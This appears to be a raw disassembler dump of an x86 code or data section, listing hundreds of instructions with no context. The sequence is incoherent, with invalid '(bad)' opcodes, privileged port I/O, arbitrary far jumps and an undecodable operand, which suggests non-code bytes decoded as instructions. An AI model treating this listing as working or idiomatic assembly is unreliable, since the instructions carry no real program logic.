  41bd2f:	add    eax,0x9c64f7b6
  41bd34:	inc    ecx
  41bd35:	dec    ebp
  41bd36:	push   esp
  41bd37:	inc    ebx
  41bd38:	fiadd  WORD PTR [eax+0x26965814]
  41bd3e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd3f:	mov    WORD PTR [esi],fs
  41bd41:	fsubr  st(5),st
  41bd43:	dec    ecx
  41bd44:	mov    eax,DWORD PTR [ebx+0x75]
  41bd47:	add    bl,BYTE PTR [eax-0xe]
  41bd4a:	out    dx,eax
  41bd4b:	push   es
  41bd4c:	push   edi
  41bd4d:	sub    eax,0x6b132b17
  41bd52:	jmp    0x41bdcf
  41bd54:	(bad)  
  41bd55:	pop    ecx
  41bd56:	adc    cl,0xbd
  41bd59:	dec    edi
  41bd5a:	lea    esi,[ebx+0x64505848]
  41bd60:	jecxz  0x41bdc8
  41bd62:	imul   ecx,eax,0xffffffc5
  41bd65:	mov    ch,0xdf
  41bd67:	pop    edx
  41bd68:	sbb    al,0x87
  41bd6a:	xchg   ebp,eax
  41bd6b:	or     al,0x40
  41bd6d:	cmp    eax,0x5716557f
  41bd72:	mov    bh,0xea
  41bd74:	mov    edi,0x5fc7b764
  41bd79:	mov    edi,0x12f6b761
  41bd7e:	xchg   edi,eax
  41bd7f:	outs   dx,DWORD PTR ds:[esi]
  41bd80:	sub    DWORD PTR ds:0x444f1b41,esp
  41bd86:	pushf  
  41bd87:	cmp    DWORD PTR [ebx-0x5c2471b2],ebx
  41bd8d:	mov    al,ds:0x43412515
  41bd92:	into   
  41bd93:	es push ebx
  41bd95:	outs   dx,BYTE PTR ds:[esi]
  41bd96:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bd97:	addr16 push esi
  41bd99:	mov    ds:0x2f0d6140,al
  41bd9e:	test   DWORD PTR [esi-0x35],edi
  41bda1:	xchg   DWORD PTR [esi-0x3e],ebx
  41bda4:	sub    dl,bh
  41bda6:	je     0x41bd8e
  41bda8:	cmp    DWORD PTR [esi],ebx
  41bdaa:	xor    al,0x20
  41bdac:	cs pop ebp
  41bdae:	stos   DWORD PTR es:[edi],eax
  41bdaf:	adc    esi,edi
  41bdb1:	in     al,0x55
  41bdb3:	jmp    0xafd0:0x28e13d2e
  41bdba:	xlat   BYTE PTR ds:[ebx]
  41bdbb:	dec    edx
  41bdbc:	enter  0xdf94,0xe6
  41bdc0:	dec    eax
  41bdc1:	lds    ecx,FWORD PTR [edi+edi*4]
  41bdc4:	out    0x76,al
  41bdc6:	xor    dl,cl
  41bdc8:	scas   al,BYTE PTR es:[edi]
  41bdc9:	xor    eax,0x666caad0
  41bdce:	out    dx,eax
  41bdcf:	out    0x17,al
  41bdd1:	jbe    0x41be29
  41bdd3:	sbb    edx,esp
  41bdd5:	inc    ecx
  41bdd6:	adc    DWORD PTR [eax],esp
  41bdd8:	or     eax,0xd6ce020d
  41bddd:	mov    cl,0xd4
  41bddf:	adc    bl,BYTE PTR [ecx]
  41bde1:	inc    esp
  41bde2:	sar    ebx,1
  41bde4:	fldenv [ebx+0x6c826540]
  41bdea:	sbb    ah,BYTE PTR [edi-0x532dfb29]
  41bdf0:	push   0xffffff9d
  41bdf2:	jg     0x41bdc8
  41bdf4:	pop    esp
  41bdf5:	cmp    eax,0x7dc1581d
  41bdfa:	into   
  41bdfb:	lods   al,BYTE PTR ds:[esi]
  41bdfc:	sub    dh,0x3d
  41bdff:	xchg   si,ax
  41be01:	adc    dl,bl
  41be03:	ja     0x41be45
  41be05:	pop    ecx
  41be06:	in     eax,dx
  41be07:	cmp    edx,DWORD PTR [esi]
  41be09:	or     BYTE PTR [edi+0x3e],bl
  41be0c:	xchg   esp,eax
  41be0d:	retf   0xe2cf
  41be10:	das    
  41be11:	out    0xa4,al
  41be13:	aad    0xbe
  41be15:	sbb    al,0x8a
  41be17:	mov    bh,0xc4
  41be19:	add    al,0x4a
  41be1b:	addr16 out dx,al
  41be1d:	sbb    DWORD PTR [eax],0x4667ceba
  41be23:	jp     0x41be17
  41be25:	push   cs
  41be26:	mov    ds:0x8b9db112,eax
  41be2b:	adc    DWORD PTR [edx+edi*2],0xb216ee14
  41be32:	jmp    0x4744:0x7d156253
  41be39:	inc    edi
  41be3a:	test   BYTE PTR [esi+edi*4+0x63],dh
  41be3e:	jl     0x41be84
  41be40:	in     eax,dx
  41be41:	or     BYTE PTR [ecx],ah
  41be43:	adc    BYTE PTR [edi+0x7f],bl
  41be46:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be47:	ss add al,0xeb
  41be4a:	pop    ds
  41be4b:	cwde   
  41be4c:	add    al,0x61
  41be4e:	lods   eax,DWORD PTR ds:[esi]
  41be4f:	jnp    0x41be93
  41be51:	adc    eax,0x719658c6
  41be56:	in     al,0xf0
  41be58:	call   0x399:0x77b75a64
  41be5f:	jne    0x41beab
  41be61:	outs   dx,BYTE PTR ds:[esi]
  41be62:	mov    DWORD PTR [edi+0x6ca642f2],ebp
  41be68:	xchg   ebp,eax
  41be69:	xor    ebx,DWORD PTR [edx]
  41be6b:	sub    BYTE PTR ds:0xc998c6cc,dh
  41be71:	test   BYTE PTR [edi],al
  41be73:	in     al,dx
  41be74:	sub    eax,0x223a37d1
  41be79:	imul   ebp,eax,0x28
  41be7c:	test   eax,0x79782ada
  41be81:	std    
  41be82:	es gs add eax,0x49ec530e
  41be89:	mov    ecx,0x1660fd8c
  41be8e:	aad    0xfc
  41be90:	cmp    BYTE PTR [eax+0x26c3f051],ah
  41be96:	and    dh,BYTE PTR [edx]
  41be98:	imul   edi,esp,0x41
  41be9b:	imul   BYTE PTR [ebx+0x1a]
  41be9e:	les    ebx,FWORD PTR [ebp-0x4ac048de]
  41bea4:	shr    DWORD PTR [esi-0x50],1
  41bea7:	pop    ecx
  41bea8:	sub    DWORD PTR [esi],esp
  41beaa:	shr    BYTE PTR [eax],0x87
  41bead:	mov    dl,0xfe
  41beaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41beb0:	xor    ecx,DWORD PTR [edi-0x3dcb0ca8]
  41beb6:	sbb    cl,BYTE PTR [ebp+0x1]
  41beb9:	mov    bh,0x10
  41bebb:	mov    bh,0x6b
  41bebd:	mov    bh,0xda
  41bebf:	pop    edi
  41bec0:	sub    edx,DWORD PTR [ecx]
  41bec2:	dec    edx
  41bec3:	inc    eax
  41bec4:	test   DWORD PTR ds:0xe42aa9a9,0x802237e4
  41bece:	xchg   BYTE PTR [ecx],bh
  41bed0:	and    esp,esi
  41bed2:	and    ebx,ebp
  41bed4:	cdq    
  41bed5:	jg     0x41beec
  41bed7:	inc    ebx
  41bed8:	jge    0x41bf08
  41beda:	jae    0x41beb2
  41bedc:	push   eax
  41bedd:	xchg   DWORD PTR [esi-0x5f],ebx
  41bee0:	out    dx,eax
  41bee1:	xor    al,0x8f
  41bee3:	cwde   
  41bee4:	icebp  
  41bee5:	xlat   BYTE PTR ds:[ebx]
  41bee6:	adc    BYTE PTR [edi+0x6e7d5042],ch
  41beec:	jmp    0x1088:0xfe04d57f
  41bef3:	xor    bl,0xbe
  41bef6:	ins    DWORD PTR es:[edi],dx
  41bef7:	imul   esp,DWORD PTR [ebp+0x6f8a8581],0x29
  41befe:	xchg   ebp,ebp
  41bf00:	retf   
  41bf01:	push   0xad8a99f1
  41bf06:	in     al,dx
  41bf07:	stos   BYTE PTR es:[edi],al
  41bf08:	outs   dx,DWORD PTR ds:[esi]
  41bf09:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bf0a:	cli    
  41bf0b:	pop    ebp
  41bf0c:	or     DWORD PTR [ebx+0x59b3707a],edi
  41bf12:	and    esp,DWORD PTR [edx-0x7b]
  41bf15:	inc    esp
  41bf16:	xor    al,0x51
  41bf18:	and    eax,0x17f59e4d
  41bf1d:	fwait
  41bf1e:	push   ebx
  41bf1f:	mov    ds:0x7d0c2913,eax
  41bf24:	add    edi,DWORD PTR [esp+ebp*4+0x29]
  41bf28:	dec    eax
  41bf29:	inc    ebx
  41bf2a:	je     0x41bf46
  41bf2c:	in     al,0x71
  41bf2e:	xor    dl,BYTE PTR [ecx+0x4c3f8e18]
  41bf34:	repnz clc 
  41bf36:	sub    al,bl
  41bf38:	lea    ebx,[ecx-0x59e21bf7]
  41bf3e:	call   0x8adc:0x78d553fe
  41bf45:	cmp    ch,al
  41bf47:	mov    ds:0x643bbfff,eax
  41bf4c:	jg     0x41bf8f
  41bf4e:	loope  0x41befc
  41bf50:	and    bl,0xaa
  41bf53:	and    BYTE PTR [edi],0x25
  41bf56:	mov    dl,0xa8
  41bf58:	pop    ebp
  41bf59:	shr    DWORD PTR [ebx+0x35d8fdc3],0xb5
  41bf60:	popf   
  41bf61:	ret    
  41bf62:	or     cl,bh
  41bf64:	inc    ebp
  41bf65:	call   0x52a96198
  41bf6a:	(bad)  
  41bf6b:	mov    edi,0x668cc4fa
  41bf70:	lds    ebx,FWORD PTR [ecx-0x244f1e86]
  41bf76:	test   BYTE PTR [esi+ebp*4+0x33739fea],0xbb
  41bf7e:	adc    BYTE PTR [ebx],cl
  41bf80:	pop    edi
  41bf81:	sar    BYTE PTR [ecx],0xaa
  41bf84:	int3   
  41bf85:	std    
  41bf86:	imul   esp,DWORD PTR [edx],0xfa2c1328
  41bf8c:	les    esi,FWORD PTR [ecx-0x32]
  41bf8f:	inc    ebx
  41bf90:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bf91:	adc    al,0x32
  41bf93:	or     edx,DWORD PTR ds:0x2755818a
  41bf99:	push   ecx
  41bf9a:	dec    edx
  41bf9b:	and    edi,DWORD PTR [esi]
  41bf9d:	mov    ds,ecx
  41bf9f:	adc    bl,BYTE PTR [esi]
  41bfa1:	rcr    DWORD PTR [ebx],cl
  41bfa3:	push   edi
  41bfa4:	mov    ds:0xc0b3908f,al
  41bfa9:	test   BYTE PTR [edi-0x17],ch
  41bfac:	and    al,0xe1
  41bfae:	add    BYTE PTR [ebx+0x8434ba5],bl
  41bfb4:	dec    esp
  41bfb5:	xor    eax,0x906aba7c
  41bfba:	xor    BYTE PTR [ebx-0x7f7dd4de],cl
  41bfc0:	jb     0x41bfe8
  41bfc2:	cs popa 
  41bfc4:	loopne 0x41c024
  41bfc6:	outs   dx,DWORD PTR ds:[esi]
  41bfc7:	sar    ecx,0x60
  41bfca:	mov    dh,BYTE PTR [edi-0x30e591e6]
  41bfd0:	fs out dx,al
  41bfd2:	aam    0xec
  41bfd4:	sub    BYTE PTR es:[esi-0x22],ch
  41bfd8:	repz jmp 0x2523ed98
  41bfde:	mov    bh,0x68
  41bfe0:	pop    esi
  41bfe1:	pop    ebp
  41bfe2:	fild   WORD PTR [ebx-0x5b210108]
  41bfe8:	rcl    DWORD PTR [edi],cl
  41bfea:	push   0xfffffffa
  41bfec:	into   
  41bfed:	dec    esp
  41bfee:	mov    esp,0x6c0f7336
  41bff3:	retf   
  41bff4:	inc    ebx
  41bff5:	dec    esp
  41bff6:	iret   
  41bff7:	stos   BYTE PTR es:[edi],al
  41bff8:	ret    
  41bff9:	ins    BYTE PTR es:[edi],dx
  41bffa:	mov    ch,0xe7
  41bffc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bffd:	cmc    
  41bffe:	sub    al,0xc5
  41c000:	mov    dl,0x1a
  41c002:	test   al,0xae
  41c004:	push   es
  41c005:	push   eax
  41c006:	repz xor DWORD PTR [ebp-0x1e],0x9477d04b
  41c00e:	test   al,0x76
  41c010:	cmp    al,0xed
  41c012:	test   eax,0x97c42513
  41c017:	sub    ch,BYTE PTR [esi-0x1513a82a]
  41c01d:	enter  0xec67,0x20
  41c021:	std    
  41c022:	fstp   DWORD PTR [edx-0x16]
  41c025:	add    al,0x22
  41c027:	fcomp  DWORD PTR [esi+eiz*1+0x32]
  41c02b:	cmp    ecx,DWORD PTR [ebp+0x68db1841]
  41c031:	(bad)  
  41c032:	xor    al,0xa3
  41c034:	lds    esp,FWORD PTR ds:0xe39232a2
  41c03a:	test   al,0x21
  41c03c:	mov    eax,0x663eb8d8
  41c041:	shr    BYTE PTR [esi],1
  41c043:	mov    ecx,0x40727911
  41c048:	dec    edi
  41c049:	mov    DWORD PTR [esp+ecx*8],esi
  41c04c:	adc    eax,0xe04192db
  41c051:	or     ebp,eax
  41c053:	aam    0x68
  41c055:	xchg   ecx,eax
  41c056:	mov    DWORD PTR [edi+ecx*4-0x6e16ac54],ebx
  41c05d:	das    
  41c05e:	loop   0x41c057
  41c060:	arpl   WORD PTR [ebx+0x4b],di
  41c063:	ficom  WORD PTR [eax]
  41c065:	xchg   esp,eax
  41c066:	xchg   BYTE PTR [ebp+ecx*1-0x7b409f80],ah
  41c06d:	scas   al,BYTE PTR es:[edi]
  41c06e:	ds lock sub edi,esi
  41c072:	in     eax,dx
  41c073:	add    eax,0x4061314a
  41c078:	out    0x49,al
  41c07a:	loope  0x41c0b1
  41c07c:	xchg   ebx,eax
  41c07d:	bound  ebx,QWORD PTR [edi+0x11234bcd]
  41c083:	push   0x1f
  41c085:	loopne 0x41c0cf
  41c087:	dec    ebp
  41c088:	adc    dh,BYTE PTR [ebx+0x76861e83]
  41c08e:	lea    eax,[ecx-0x1f0e3878]
  41c094:	jmp    0x82b0930c
  41c099:	ror    dh,1
  41c09b:	bound  ebp,QWORD PTR [edi-0x6d]
  41c09e:	lods   eax,DWORD PTR gs:[esi]
  41c0a0:	push   0x20
  41c0a2:	dec    ecx
  41c0a3:	pop    ebx
  41c0a4:	sub    BYTE PTR [edx],ah
  41c0a6:	lods   al,BYTE PTR ds:[esi]
  41c0a7:	xor    al,0xdd
  41c0a9:	xlat   BYTE PTR ds:[ebx]
  41c0aa:	popf   
  41c0ab:	popf   
  41c0ac:	adc    eax,edi
  41c0ae:	mov    esp,DWORD PTR [eax+0x1a46e47]
  41c0b4:	fist   WORD PTR [ebx]
  41c0b6:	push   edx
  41c0b7:	sub    eax,0xceb6b540
  41c0bc:	call   0xe347:0x88f257f
  41c0c3:	icebp  
  41c0c4:	ret    
  41c0c5:	or     al,0x3e
  41c0c7:	cld    
  41c0c8:	dec    eax
  41c0c9:	jg     0x41c07f
  41c0cb:	mov    esp,0x969bff9a
  41c0d0:	fbld   TBYTE PTR [ebx]
  41c0d2:	dec    ebx
  41c0d3:	cmp    ebx,DWORD PTR [ecx+0x69099b55]
  41c0d9:	fisttp DWORD PTR [ebx]
  41c0db:	push   0x52
  41c0dd:	xchg   ebp,eax
  41c0de:	ss jle 0x41c084
  41c0e1:	sbb    eax,0xce683a0b
  41c0e6:	stc    
  41c0e7:	jecxz  0x41c09a
  41c0e9:	or     al,0x11
  41c0eb:	jnp    0x41c0a5
  41c0ed:	clc    
  41c0ee:	stos   DWORD PTR es:[edi],eax
  41c0ef:	xchg   ebx,eax
  41c0f0:	adc    cl,bl
  41c0f2:	mov    ah,0x2f
  41c0f4:	sub    edx,edx
  41c0f6:	sub    eax,0x332eb398
  41c0fb:	mov    ah,0xc5
  41c0fd:	aas    
  41c0fe:	and    esi,0x50
  41c101:	fs cmp eax,0x433baf1e
  41c107:	pop    edi
  41c108:	mov    ds:0xb0e99cc4,eax
  41c10d:	loop   0x41c0fd
  41c10f:	mov    al,ds:0x2229ab3f
  41c114:	loop   0x41c12b
  41c116:	ins    BYTE PTR es:[edi],dx
  41c117:	add    ebx,esi
  41c119:	test   BYTE PTR [edi],ah
  41c11b:	pusha  
  41c11c:	jle    0x41c0b7
  41c11e:	fnstcw WORD PTR [ebp+0x27]
  41c121:	mul    DWORD PTR [edi+0x75]
  41c124:	fisub  WORD PTR [ebp-0xb]
  41c127:	mov    ds:0xabba993,al
  41c12c:	pushf  
  41c12d:	push   0xffffffaa
  41c12f:	add    esp,edi
  41c131:	mov    ?,ebp
  41c133:	mov    bh,0xe6
  41c135:	pushf  
  41c136:	lods   al,BYTE PTR ds:[esi]
  41c137:	fisttp WORD PTR [ebx]
  41c139:	lock stc 
  41c13b:	retf   
  41c13c:	mov    BYTE PTR [esi-0x3bc1d67b],ah
  41c142:	ds ss pop es
  41c145:	scas   eax,DWORD PTR es:[edi]
  41c146:	jnp    0x41c18e
  41c148:	pop    eax
  41c149:	lods   eax,DWORD PTR ds:[esi]
  41c14a:	cmp    al,0xa4
  41c14c:	xor    eax,0xe51e143b
  41c151:	inc    esp
  41c152:	mov    ch,0x2f
  41c154:	mov    edi,DWORD PTR [ecx-0x41c53f3f]
  41c15a:	aas    
  41c15b:	mov    ds:0x44026992,eax
  41c160:	xchg   ecx,eax
  41c161:	outs   dx,BYTE PTR ds:[esi]
  41c162:	adc    esi,eax
  41c164:	jb     0x41c108
  41c166:	loope  0x41c126
  41c168:	pop    esp
  41c169:	cmp    ecx,eax
  41c16b:	mov    al,ds:0xe8996204
  41c170:	xor    eax,0xa2e7e039
  41c175:	xchg   ebp,eax
  41c176:	ss (bad) 
  41c178:	xor    eax,0xefe08739
  41c17d:	lods   eax,DWORD PTR ds:[esi]
  41c17e:	mov    al,0x24
  41c180:	mov    edx,0x26378b5f
  41c185:	clc    
  41c186:	not    DWORD PTR [esi+0x20a43a2b]
  41c18c:	push   edx
  41c18d:	sbb    al,0xe1
  41c18f:	xchg   esi,eax
  41c190:	push   edi
  41c191:	mul    DWORD PTR [edx-0x5a73cbab]
  41c197:	xor    DWORD PTR [esi],eax
  41c199:	das    
  41c19a:	arpl   di,sp
  41c19c:	dec    ebp
  41c19d:	pop    ss
  41c19e:	xchg   DWORD PTR ds:0x895d7759,edx
  41c1a4:	popf   
  41c1a5:	dec    ecx
  41c1a6:	inc    ebx
  41c1a7:	sar    DWORD PTR [ebx],cl
  41c1a9:	stos   DWORD PTR es:[edi],eax
  41c1aa:	inc    esi
  41c1ab:	loope  0x41c13d
  41c1ad:	fmul   QWORD PTR [edx]
  41c1af:	sub    BYTE PTR [ecx-0x4ab0a5ba],ch
  41c1b5:	xchg   esi,eax
  41c1b6:	push   cs
  41c1b7:	sbb    esi,eax
  41c1b9:	cld    
  41c1ba:	jbe    0x41c1a6
  41c1bc:	cmp    eax,DWORD PTR [ebp+eax*1-0x419c6b6d]
  41c1c3:	jmp    0x41c159
  41c1c5:	test   eax,0x711441dd
  41c1ca:	and    DWORD PTR [ebp-0x43],edx
  41c1cd:	cmp    eax,0x566302f6
  41c1d2:	enter  0x6865,0x96
  41c1d6:	add    DWORD PTR [eax],ecx
  41c1d8:	sub    dh,BYTE PTR [edi]
  41c1da:	test   ah,dh
  41c1dc:	loope  0x41c190
  41c1de:	fsubr  DWORD PTR [esi]
  41c1e0:	xchg   ebp,eax
  41c1e1:	jae    0x41c1ac
  41c1e3:	or     DWORD PTR [eax+0x3d4d229f],eax
  41c1e9:	add    BYTE PTR [edx-0x38],dl
  41c1ec:	mov    ah,0x29
  41c1ee:	jg     0x41c21d
  41c1f0:	sar    DWORD PTR [ecx+ebp*4-0x79],0x69
  41c1f5:	das    
  41c1f6:	arpl   bp,sp
  41c1f8:	or     BYTE PTR [esi-0x7c],0x3
  41c1fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c1fd:	push   esi
  41c1fe:	(bad)  
  41c1ff:	push   ecx
  41c200:	pop    esi
  41c201:	mov    dh,ch
  41c203:	push   ss
  41c204:	xor    eax,0xfc571b86
  41c209:	and    dl,bl
  41c20b:	cli    
  41c20c:	mov    dl,0x79
  41c20e:	mov    dh,0x46
  41c210:	popf   
  41c211:	and    edx,esp
  41c213:	add    BYTE PTR [esp+ecx*2+0x4a2783c4],ah
  41c21a:	sbb    BYTE PTR [ecx],ah
  41c21c:	xor    al,0x6c
  41c21e:	sti    
  41c21f:	sub    BYTE PTR [ebx-0x59],ah
  41c222:	adc    ebp,DWORD PTR [ecx+esi*2+0x3744ec82]
  41c229:	repnz rcl BYTE PTR [edi],cl
  41c22c:	and    BYTE PTR [ecx+0x7a097a89],ch
  41c232:	pop    edx
  41c233:	dec    ebx
  41c234:	mov    esp,0xf7142d13
  41c239:	outs   dx,DWORD PTR ds:[esi]
  41c23a:	mov    ah,0x97
  41c23c:	(bad)  
  41c23d:	adc    dh,BYTE PTR [esi]
  41c23f:	mov    al,ah
  41c241:	in     eax,0xf0
  41c243:	dec    eax
  41c244:	je     0x41c1f9
  41c246:	pop    esp
  41c247:	sub    DWORD PTR [edx],ebp
  41c249:	or     eax,DWORD PTR [edi]
  41c24b:	addr16 mov ds:0x39df,eax
  41c24f:	cmp    ah,BYTE PTR [ebp+0x19b09cd3]
  41c255:	dec    ebp
  41c256:	inc    ebp
  41c257:	and    ebp,DWORD PTR [edi]
  41c259:	ds aas 
  41c25b:	xor    eax,0x818db8c8
  41c260:	jno    0x41c23e
  41c262:	sub    dh,BYTE PTR [esi+0x7d]
  41c265:	hlt    
  41c266:	mov    dh,0xcd
  41c268:	(bad)  
  41c269:	push   eax
  41c26a:	(bad)  [ebx]
  41c26c:	std    
  41c26d:	jb     0x41c2c9
  41c26f:	pop    ebx
  41c270:	cmp    ebx,DWORD PTR [ecx]
  41c272:	or     BYTE PTR cs:[eax-0x11],0xf7
  41c277:	sub    DWORD PTR [edx],0x5538921f
  41c27d:	mov    bh,0xa7
  41c27f:	jecxz  0x41c234
  41c281:	and    al,0x88
  41c283:	hlt    
  41c284:	and    BYTE PTR [edx-0x75],ah
  41c287:	dec    eax
  41c288:	cwde   
  41c289:	jne    0x41c23c
  41c28b:	adc    dl,BYTE PTR [eax+0x77]
  41c28e:	fwait
  41c28f:	inc    eax
  41c290:	xchg   ebx,ebp
  41c292:	jp     0x41c28a
  41c294:	sahf   
  41c295:	cmp    BYTE PTR [ecx+esi*2-0x64ef870b],ah
  41c29c:	lods   eax,DWORD PTR ds:[esi]
  41c29d:	xor    ch,BYTE PTR [esi]
  41c29f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c2a0:	(bad)  
  41c2a1:	nop
  41c2a2:	mov    WORD PTR [edi+0x76b33696],cs
  41c2a8:	cmp    esp,esi
  41c2aa:	or     cl,BYTE PTR [ecx+0x7ac2d2ac]
  41c2b0:	leave  
  41c2b1:	cld    
  41c2b2:	jmp    0xc350:0xe8459843
  41c2b9:	add    cl,cl
  41c2bb:	jg     0x41c2d3
  41c2bd:	cdq    
  41c2be:	outs   dx,DWORD PTR ds:[esi]
  41c2bf:	cmp    DWORD PTR [edi-0x311d7e71],0x48890634
  41c2c9:	ins    DWORD PTR es:[edi],dx
  41c2ca:	xor    DWORD PTR [ebx-0x50e6cf78],0xc
  41c2d1:	sub    DWORD PTR [ebx-0x3],edx
  41c2d4:	clc    
  41c2d5:	int3   
  41c2d6:	fimul  DWORD PTR [eax]
  41c2d8:	mov    bh,0xa4
  41c2da:	push   eax
  41c2db:	mov    ebp,0x103ed79a
  41c2e0:	xchg   ecx,eax
  41c2e1:	sbb    cl,cl
  41c2e3:	mov    bl,0x5e
  41c2e5:	stos   BYTE PTR es:[edi],al
  41c2e6:	add    eax,0xc8bae83d
  41c2eb:	cmp    dh,al
  41c2ed:	fwait
  41c2ee:	add    al,0xd0
  41c2f0:	and    ecx,DWORD PTR [edx]
  41c2f2:	sub    dh,ch
  41c2f4:	mov    eax,ds:0x6aff941
  41c2f9:	in     eax,dx
  41c2fa:	xor    dl,BYTE PTR [eax]
  41c2fc:	mov    dl,0x8e
  41c2fe:	dec    ebx
  41c2ff:	scas   eax,DWORD PTR es:[edi]
  41c300:	mov    BYTE PTR gs:[eax],bh
  41c303:	and    esp,DWORD PTR [eax+0x21]
  41c306:	ret    0x535e
  41c309:	fcom   QWORD PTR [eax-0x49]
  41c30c:	shl    DWORD PTR [ebp+0x1ed1a0fa],1
  41c312:	rol    BYTE PTR [ebx+0x6d4f479f],0x27
  41c319:	sar    DWORD PTR [esi],0x87
  41c31c:	sub    DWORD PTR [edi],ebp
  41c31e:	sbb    al,0xd6
  41c320:	fimul  DWORD PTR [ebx-0x667a98eb]
  41c326:	push   ebx
  41c327:	xchg   eax,edi
  41c329:	inc    edi
  41c32a:	nop
  41c32b:	test   al,0x88
  41c32d:	dec    esp
  41c32e:	fild   DWORD PTR [eax+0x5901c947]
  41c334:	cdq    
  41c335:	repnz lds esi,FWORD PTR [edx-0xd33d53]
  41c33c:	lods   al,BYTE PTR ds:[esi]
  41c33d:	adc    eax,0x6ce294a7
  41c342:	mov    DWORD PTR [eax],edi
  41c344:	pop    ebp
  41c345:	cmp    esi,DWORD PTR gs:[ecx-0x77]
  41c349:	(bad)  
  41c34a:	fcmove st,st(1)
  41c34c:	mov    bl,0x8e
  41c34e:	jecxz  0x41c397
  41c350:	fimul  DWORD PTR [eax+eiz*4]
  41c353:	cmp    ebp,DWORD PTR [eax]
  41c355:	(bad)  
  41c356:	pop    ds
  41c357:	mov    cl,0x87
  41c359:	out    0x41,al
  41c35b:	xchg   edx,eax
  41c35c:	cmp    eax,0x4e855be1
  41c361:	sbb    esi,ecx
  41c363:	gs hlt 
  41c365:	dec    esi
  41c366:	out    dx,al
  41c367:	ins    BYTE PTR es:[edi],dx
  41c368:	mov    BYTE PTR [ebp-0x2],ch
  41c36b:	dec    edi
  41c36c:	ret    
  41c36d:	mov    bl,0x89
  41c36f:	xor    DWORD PTR [ecx+0x67758f3f],esi
  41c375:	das    
  41c376:	pop    esp
  41c377:	cmc    
  41c378:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c379:	lea    edi,[edx]
  41c37b:	fisttp DWORD PTR [ebp-0x18]
  41c37e:	sar    BYTE PTR [ebp+ebx*4+0x2059b586],1
  41c385:	popa   
  41c386:	xor    esp,esi
  41c388:	or     ah,cl
  41c38a:	pop    edi
  41c38b:	retf   0xc119
  41c38e:	xor    eax,0x3cbd35e5
  41c393:	mov    ah,0x14
  41c395:	aad    0x62
  41c397:	jp     0x41c3bf
  41c399:	push   esi
  41c39a:	sub    bl,BYTE PTR [eax-0x1fd26ba8]
  41c3a0:	xchg   esp,eax
  41c3a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c3a2:	js     0x41c35f
  41c3a4:	xor    dh,BYTE PTR [ebp-0x6e]
  41c3a7:	mov    esp,0xcd765970
  41c3ac:	mov    cl,0x15
  41c3ae:	cmp    ebp,edx
  41c3b0:	push   ebp
  41c3b1:	mov    al,ds:0x87ba976b
  41c3b6:	cmc    
  41c3b7:	push   esp
  41c3b8:	xor    BYTE PTR [edi+0x6fa76cba],0x82
  41c3bf:	adc    DWORD PTR [edx+0x60b2bf1d],esi
  41c3c5:	aas    
  41c3c6:	pop    ss
  41c3c7:	int    0x77
  41c3c9:	sub    BYTE PTR [edi+ecx*2+0x62ab7ebb],0xcb
  41c3d1:	add    DWORD PTR [edx],0x8f493f61
  41c3d7:	mov    edi,DWORD PTR [edx+ebx*1-0x2d]
  41c3db:	mov    ecx,0x9dc86a51
  41c3e0:	or     eax,0x1847da30
  41c3e5:	pop    esp
  41c3e6:	push   ss
  41c3e7:	jo     0x41c468
  41c3e9:	dec    edi
  41c3ea:	jge    0x41c41a
  41c3ec:	ja     0x41c43c
  41c3ee:	arpl   WORD PTR [eax+eax*2+0x2],di
  41c3f2:	ja     0x41c43a
  41c3f4:	ja     0x41c39d
  41c3f6:	mov    edi,0x88e47a89
  41c3fb:	stos   DWORD PTR es:[edi],eax
  41c3fc:	int3   
  41c3fd:	jno    0x41c3c2
  41c3ff:	or     eax,0x4dcfa63d
  41c404:	cmp    al,0x2c
  41c406:	push   eax
  41c407:	push   0x6c
  41c409:	icebp  
  41c40a:	stos   BYTE PTR es:[edi],al
  41c40b:	mov    ecx,0x3a6593ad
  41c410:	test   BYTE PTR [ecx],al
  41c412:	in     al,dx
  41c413:	sub    DWORD PTR [esi+0x533b196a],0xffffffb9
  41c41a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c41b:	popa   
  41c41c:	fs ror ah,0xd1
  41c420:	jge    0x41c478
  41c422:	lods   eax,DWORD PTR ds:[esi]
  41c423:	les    edx,FWORD PTR [esi+ecx*2+0xbfa4b89]
  41c42a:	push   esp
  41c42b:	or     DWORD PTR [ebp-0x4c],edx
  41c42e:	push   es
  41c42f:	push   0x45
  41c431:	add    DWORD PTR [ebx-0x3f68a2b7],eax
  41c437:	jb     0x41c3e4
  41c439:	retf   0xd377
  41c43c:	bound  ebp,QWORD PTR [esi+eiz*4-0x63]
  41c440:	mov    ds:0x67c3f7ff,al
  41c445:	adc    esi,esp
  41c447:	(bad)  
  41c448:	add    ebp,DWORD PTR [edx+0x67]
  41c44b:	imul   edi,DWORD PTR [ecx+esi*2],0xbdbd7a57
  41c452:	mov    ds:0x36d73ef7,al
  41c457:	sub    BYTE PTR ds:0xdf064768,0xf9
  41c45e:	jnp    0x41c435
  41c460:	fsubr  DWORD PTR [eax-0x3b3a3859]
  41c466:	inc    ecx
  41c467:	enter  0xf5c9,0xb6
  41c46b:	sbb    ebx,DWORD PTR [esi+0x23]
  41c46e:	and    al,0x91
  41c470:	jnp    0x41c498
  41c472:	cwde   
  41c473:	and    eax,0x3fa92d7c
  41c478:	rcr    DWORD PTR [esi+edx*1-0x33],1
  41c47c:	loope  0x41c425
  41c47e:	pop    esp
  41c47f:	out    dx,al
  41c480:	fdiv   QWORD PTR [edx]
  41c482:	cs pop ebp
  41c484:	lea    esp,[ebx+0x9]
  41c487:	xchg   edx,eax
  41c488:	test   eax,0x3ca90470
  41c48d:	dec    esp
  41c48e:	cmp    DWORD PTR [eax],ebx
  41c490:	jl     0x41c44e
  41c492:	sti    
  41c493:	adc    esi,ecx
  41c495:	adc    BYTE PTR [edx+0xd],al
  41c498:	xlat   BYTE PTR ds:[ebx]
  41c499:	push   eax
  41c49a:	lods   eax,DWORD PTR ds:[esi]
